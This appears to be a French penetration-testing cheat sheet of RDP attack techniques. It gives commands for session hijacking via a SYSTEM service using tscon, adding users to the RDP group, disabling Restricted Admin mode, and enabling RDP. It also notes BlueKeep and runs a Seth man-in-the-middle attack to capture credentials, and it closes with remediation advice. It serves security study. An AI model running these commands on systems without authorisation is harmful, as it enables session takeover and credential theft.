
- [ ] [[#1. Bruteforce]]
- [ ] [[#2. Session Hijacking (SYSTEM priv)]]
- [ ] [[#3. Pass The Hash Pass The Hash (PtH) XFREERDP]]
- [ ] [[#4. Ajouter un user au groupe RDP]]
- [ ] [[#5. Activer RDP sur machine]]
- [ ] [[#6. CVEs]]
- [ ] [[#7. MiTM]]


---
# 1. Bruteforce

[[Bruteforce en ligne#RDP]]


---
# 2. Session Hijacking (SYSTEM priv)

> [!IMPORTANT]
> Ejecte l'utilisateur de la session

Afficher les sessions

```Powershell
query user
```

Création du service 'sessionhijack'

```Powershell
sc.exe create sessionhijack binpath= "cmd.exe /k tscon <id_cible> /dest:<OUR_SESSION_NAME>"
```

Exécution du service

```cmd-session
net start sessionhijack
```


---

# 3. Pass The Hash [[Pass The Hash (PtH)#XFREERDP]]


---

# 4. Ajouter un user au groupe RDP


```cmd
net localgroup "Remote Desktop Users" UserLoginName /add
```

Désactiver le Restricted Admin Mode sur la target

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

---
# 5. Activer RDP sur machine


https://www.airdroid.com/quick-guides/powershell-enable-rdp/

```
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name 'fDenyTSConnections' -value 0
```

```
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```



---
# 6. CVEs


## BlueKeep ([CVE-2019-0708](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708))

Use After Free

> [!IMPORTANT]
> Peut causer des BSOD

## SYSTÈMES AFFECTÉS

- Windows 2003
- Windows 7
- Windows Server 2008
- Windows Server 2008 R2
- Windows Vista
- Windows XP


---
# 7. MiTM

https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/adversary-in-the-middle/rdp-mitm

https://github.com/SySS-Research/Seth

Seth est un outil écrit en Python et Bash qui permet d'intercepter les connexions RDP en tentant de downgrade la connexion afin d'extraire les identifiants en clair. Il a été développé afin de sensibiliser et d'éduquer à l'importance d'une configuration correcte des connexions RDP dans le cadre de tests d'intrusion, d'ateliers ou de conférences. Son auteur est Adrian Vollmer (SySS GmbH).


Lancer seth

```
sudo ./seth.sh <interface> <Attacker-IP> <Victim-IP> <Server-IP>
```

Plus qu'a attendre que la cible se connecte au serveur.


## Prevention / Remediation

- Activer NLA sur le serveur (Forcer avec GPO):
	- Computer Configuration > Policies > Administrative Templates > Windows Components > Remote Desktop Services > Remote Desktop Session Host > Security > Require user authentication for remote connections by using Network Level Authentication > Enabled.
- Désactiver la connexion si le certificat ne peut pas être validé (Forcer avec GPO) :
	- Computer configuration > Policies > Administrative Templates > Windows Components >Remote Desktop Services (or Terminal Services) > Remote Desktop Connection Client > Configure server authentication for client.